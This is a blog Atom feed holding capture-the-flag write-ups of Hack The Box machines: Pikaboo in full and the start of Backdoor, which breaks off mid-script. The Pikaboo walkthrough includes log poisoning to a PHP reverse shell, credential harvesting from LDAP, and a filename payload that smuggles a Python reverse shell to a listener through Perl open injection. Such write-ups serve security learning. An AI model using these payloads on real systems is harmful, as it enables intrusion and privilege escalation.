<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-12-05T04:38:41+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">nafsuuddini08.io</title><subtitle>This my blog where i post some projects and tutorials stuff.</subtitle><author><name>Nafsu Uddin</name></author><entry><title type="html">HTB - Pikaboo</title><link href="http://localhost:4000/htb-pikaboo/" rel="alternate" type="text/html" title="HTB - Pikaboo" /><published>2021-12-04T00:00:00+01:00</published><updated>2021-12-04T00:00:00+01:00</updated><id>http://localhost:4000/htb-pikaboo</id><content type="html" xml:base="http://localhost:4000/htb-pikaboo/">&lt;p&gt;pikaboo is a machine with hard difficulty both at the level of instruction and escalation of privileges.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/portada.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;machine matrix:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/matrix.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;First we are going to create a directory as the name of the machine and with &lt;strong&gt;&lt;em&gt;mkt&lt;/em&gt;&lt;/strong&gt; we are going to create the following directories to better locate the content.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura1.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;mkt is a function I have defined in the &lt;strong&gt;&lt;em&gt;~/.zshrc&lt;/em&gt;&lt;/strong&gt; file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura2.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;First we send an icmp trace to see if we have a connection on the victim machine, and with the ttl I know this is a linux machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura3.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And in my case i have a function that is &lt;strong&gt;&lt;em&gt;wichsystem&lt;/em&gt;&lt;/strong&gt; that through the ttl reports me if it is a windows or linux machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura4.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And the &lt;strong&gt;&lt;em&gt;wichsystem&lt;/em&gt;&lt;/strong&gt; function is defined in the following path.&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura5.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;When we ping the ttl it reports 63 but this is because there are intermediate nodes.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura6.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;

&lt;p&gt;With namp we will scan which ports are open on the victim machine so we can penetrate it heheheh XD.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura7.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Basically i report the scan in a grepable format because I have a function defined in the &lt;strong&gt;&lt;em&gt;~/.zshrc&lt;/em&gt;&lt;/strong&gt; called &lt;strong&gt;&lt;em&gt;extractports&lt;/em&gt;&lt;/strong&gt; that shows me the available ports in a much more elegant way and copies it to the clipboard.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura8.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And now we do another scan to find out the versions of the services running on the different ports.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Thu Dec  2 00:38:35 2021 as: nmap -sCV -p21,22,80 -oN targeted 10.10.10.249
Nmap scan report for 10.10.10.249
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
|_  256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec  2 00:38:46 2021 -- 1 IP address (1 host up) scanned in 11.11 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As port 22 is running ftp, I check if the user &lt;strong&gt;&lt;em&gt;anonymous&lt;/em&gt;&lt;/strong&gt; is enabled, but it is not.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura9.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Well, as the http service has port 80, with &lt;strong&gt;&lt;em&gt;whatweb&lt;/em&gt;&lt;/strong&gt; we do a little recognition.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura10.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We access the website and with &lt;strong&gt;&lt;em&gt;wappalyzer&lt;/em&gt;&lt;/strong&gt; we see information, but i can see any useful information about the website.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura11.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And in the pokatdex section I don’t see much information except that it is using an api called &lt;strong&gt;&lt;em&gt;PokeApi&lt;/em&gt;&lt;/strong&gt; that we will see it later.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura12.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If I go to the admin section it asks me for a username and password which we do not have the credentials at the moment.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura13.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And in the contact section there was a contact form and i wanted to test if the site was vunlerable to &lt;strong&gt;&lt;em&gt;xss&lt;/em&gt;&lt;/strong&gt; attacks, but apparently not.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura14.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now I proceed with the fuzzing phase with &lt;strong&gt;&lt;em&gt;wfuzz&lt;/em&gt;&lt;/strong&gt; to see if there are any potential routes. And almost all the routes return me admin pages.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura15.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we can do the same with &lt;strong&gt;&lt;em&gt;gobuster&lt;/em&gt;&lt;/strong&gt; which is made in go language and you know that go works well with sockets and connections.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura16.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And with both gobuester and wfuzz I get back the same routes that are all admin sites. And i can’t access any of these pages because I need credentials.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura17.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;As there was an ftp service that i wanted to know if it had any vulnerabilities using the searchsploit tool, but I didn’t find anything interesting.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura18.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;What I did with the &lt;strong&gt;&lt;em&gt;dirsearch&lt;/em&gt;&lt;/strong&gt; tool is to search the directories that are available on the victim machine’s web site.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura19.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And I found an interesting route.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura20.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we can see that we are viewing the status panel of the apache service.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura21.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Let’s test what more potential routes we have through this route, and we see that there is a page through this route let’s see what it is.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura22.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we see that there is a dashboard and in this case the wappalyzer we do not see anything interesting.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura23.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we see that I am logged in with a user on this page, but I can’t do anything here, neither log out nor see the notifications.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura24.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Well, looking around the site and doing some research, it is simply a default templet that is made in boostrap.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura26.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now what occurs to me is to fuzz this page to see some potential route, in this case I will use &lt;strong&gt;&lt;em&gt;ffuf&lt;/em&gt;&lt;/strong&gt;. And well, we found interesting routes such as those of logs.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura28.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Y podemos observar que podemos ver los logs del servico ftp que corre en el puerto 21.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura29.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to visualize the content better with &lt;strong&gt;&lt;em&gt;curl&lt;/em&gt;&lt;/strong&gt;, and we see that there is a user that has been able to authenticate successfully through ftp that is the user &lt;strong&gt;&lt;em&gt;pwnmeow&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura30.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Seeing this, what we are going to do is to make a reverse shell with php at the time of putting the credentials in the ftp and at the same time connect through curl. and boom!!! we have access to the machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura32.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We do a cat &lt;strong&gt;&lt;em&gt;/etc/passwd&lt;/em&gt;&lt;/strong&gt; to see the users available on the system.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura33.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We access in the home directory of the user pwnmeow to see if it has some type of file that interests us and we can see that we have first flag.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura34.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And here we can visualize the first flag that is the “user.txt”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura35.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Ok and now what? the first thing I do is with &lt;strong&gt;&lt;em&gt;crontab&lt;/em&gt;&lt;/strong&gt; to see if it is running any script, and we see that there is a script that is running every second from the user &lt;strong&gt;&lt;em&gt;root&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura36.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to see the content of this script, and we see that this script is executing another script which is the &lt;strong&gt;&lt;em&gt;csvupdate&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura37.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we see that the script &lt;strong&gt;&lt;em&gt;csvupdate&lt;/em&gt;&lt;/strong&gt; is made in perl.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura38.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;After analyzing the script several times, I found an interesting argument. After some googling I found that the open function is executable if it is defined with two arguments.&lt;/p&gt;

&lt;p&gt;https://stackoverflow.com/questions/26614348/perl-open-injection-prevention&lt;/p&gt;

&lt;p&gt;https://news.ycombinator.com/item?id=3943116&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura39.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Before exploiting the other vulnerability, I’m going to go into the configuration folder where the &lt;strong&gt;&lt;em&gt;pokeAPI&lt;/em&gt;&lt;/strong&gt; is to see if we can find any access credentials, And well we see an interesting file which is the &lt;strong&gt;&lt;em&gt;config&lt;/em&gt;&lt;/strong&gt; file and as we know if we find configuration file that file may contain passwords and username.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura40.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And inside the configuration file we see that there is a file which is the &lt;strong&gt;&lt;em&gt;settings.py&lt;/em&gt;&lt;/strong&gt; let’s have a look to see what it can contain.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura41.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And magic!!!, we see that this machine is running ldap and we see that there is a username and password.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura42.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;OMG !! I don’t remember how a user with a password was listed in ldap. nothing happens our friend google will save us.&lt;/p&gt;

&lt;p&gt;https://stackoverflow.com/questions/42845186/ldapsearch-with-username-and-password&lt;/p&gt;

&lt;p&gt;And we can see that we have an encrypted password of the user &lt;em&gt;** pwnmeow **&lt;/em&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura43.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to decode the password in &lt;em&gt;** base64 **&lt;/em&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura44.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;let’s check if this password works when accessing via ftp. and we see that if we can access and in this case we can access the directories. in this case I did not find any interesting file.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura45.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;OK, what now? After logging in as pwnmeow user we can upload the file in one of the directories via this FTP server, We need &lt;strong&gt;&lt;em&gt;.csv&lt;/em&gt;&lt;/strong&gt; at the as to bypass the check in the payload file. Now let’s create the payload as .csv file on the local machine.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;touch &quot;|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\&quot;10.10.16.113\&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;sh\&quot;)';echo .csv&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Ok now what we are going to do is to upload the payload in the ftp server, in my case what I have done is from my local computer create an empty file called “test” and then paste the payload specifying the ip address and the port that we are listening in netcat.&lt;/p&gt;

&lt;p&gt;And that’s it, you are the root user on the victim machine.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura46.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;With python we are going to spawn a pseudo console.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura47.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And now we can see the second flag which is the &lt;strong&gt;&lt;em&gt;root.txt&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-pikaboo/captura48.png&quot; /&gt;
&lt;/p&gt;</content><author><name>Nafsu Uddin</name></author><category term="Hack the box" /><category term="reverse shell" /><category term="lfi" /><summary type="html">pikaboo is a machine with hard difficulty both at the level of instruction and escalation of privileges, It has vunlerabilities such as lfi on the web side and also perl vunlerability, as well as crendential access via ldap.</summary></entry><entry><title type="html">HTB - Backdoor</title><link href="http://localhost:4000/htb-backdoor/" rel="alternate" type="text/html" title="HTB - Backdoor" /><published>2021-11-30T00:00:00+01:00</published><updated>2021-11-30T00:00:00+01:00</updated><id>http://localhost:4000/htb-backdoor</id><content type="html" xml:base="http://localhost:4000/htb-backdoor/">&lt;p&gt;Backdoor is a machine that has linux OS with easy level of difficulty both in terms of intrusion and privilege escalation. on the port 80 runs wordpress which is vulnerable to local file inclusion and also the machine is vulnerable to remote command execution.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/portada.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Machine matrix:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/nivel.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;First I will create a directory with the name of the machine, and with &lt;strong&gt;&lt;em&gt;mkt&lt;/em&gt;&lt;/strong&gt; I will create the following directories to be able to move better the content of each one of those directories.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura1.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;mkt is a function that i have defined in the &lt;strong&gt;&lt;em&gt;~/.zshrc&lt;/em&gt;&lt;/strong&gt; so that I can create these directories without creating them one by one.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura2.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;recognition&quot;&gt;Recognition&lt;/h2&gt;

&lt;p&gt;We send one icmp trace to the victim machine, and we can see that we have sent a packet and received that packet back. and through the TTL I know that I am on a linux machine. since linux machines have ttl 64 and windows machines have ttl 128.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura3.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If you asking why when I receive the packet the ttl shows 63 instead of 64? this is because when we send icmp traces to the machine it goes through a series of intermediary nodes and this causes the ttl to decrease by one digit or unit whatever you want to call it. we can see this if we do a traceroute with the &lt;strong&gt;&lt;em&gt;-R&lt;/em&gt;&lt;/strong&gt; parameter.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/trace.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Anyway i have a tool on my system called &lt;strong&gt;&lt;em&gt;wichsystem&lt;/em&gt;&lt;/strong&gt; that tells you if the machine is linux or windows through the ttl.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-backdoor/captura4.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And this is the python script of the function wichsystem.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
#coding: utf-8
&lt;/span&gt; 
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;
 
&lt;span class=&quot;c1&quot;&gt;# python3 wichSystem.py YOURIP 
&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[!] Uso: python3 &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &amp;lt;direccion-ip&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 
    &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/usr/bin/ping -c 1 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PIPE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;err&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;proc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;communicate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
    &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
    &lt;span class=&quot;n&quot;&gt;ttl_value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;\d{1,3}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;out&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttl_value&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 
    &lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ttl&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Linux&quot;&lt;/span&gt;
